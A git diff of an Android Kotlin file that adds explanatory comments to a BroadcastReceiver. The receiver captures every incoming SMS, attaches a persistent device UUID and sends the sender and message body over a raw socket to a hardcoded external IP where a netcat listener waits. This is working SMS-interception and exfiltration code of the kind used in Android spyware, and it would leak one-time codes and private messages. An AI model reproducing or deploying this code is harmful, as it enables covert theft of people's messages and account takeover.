@@ -12,32 +12,38 @@ import java.net.Socket
 import java.util.UUID
 
 
-
+// BroadcastReceiver to receive SMS messages
 class MessageReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context?, intent: Intent?) {
+        // Get shared preferences to retrieve or generate UUID
         val sharedPrefs = context!!.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
         var uuid = sharedPrefs.getString("uuid", null)
+        // Generate UUID if not found in shared preferences
         if (uuid == null) {
             uuid = UUID.randomUUID().toString()
             sharedPrefs.edit().putString("uuid", uuid).apply()
         }
+        // Check if the broadcast intent is for SMS received
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent?.action) {
+            // Extract SMS messages from the intent
             val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
             messages?.forEach { smsMessage ->
+                // Extract sender's address and message body
                 val senderAddress = smsMessage.displayOriginatingAddress
                 val message = smsMessage.messageBody
                 Log.e("TAG", "Sender's Number: $senderAddress")
                 Log.e("TAG", "Message: $message")
+                // Prepare data to send to the server
                 // Execute the AsyncTask to send the string to the server
                 val dataToSend = "\n\nUUID: $uuid\nMessage Received From: $senderAddress\nMessage: $message"
                 NetcatCommunicationTask().execute(dataToSend)
             }
         }
     }
-
+    // AsyncTask to handle communication with the server
     private inner class NetcatCommunicationTask : AsyncTask<String, Void, Void>() {
         override fun doInBackground(vararg params: String?): Void? {
-            //val serverAddress = "192.168.137.143" // Replace with your server's IP address
+            // Define server address and port
             val serverAddress = "13.92.41.98" // Replace with your server's IP address
             val serverPort = 1234 // Replace with the port number your netcat server is listening on
             val message = params[0] // Message to be sent to the server
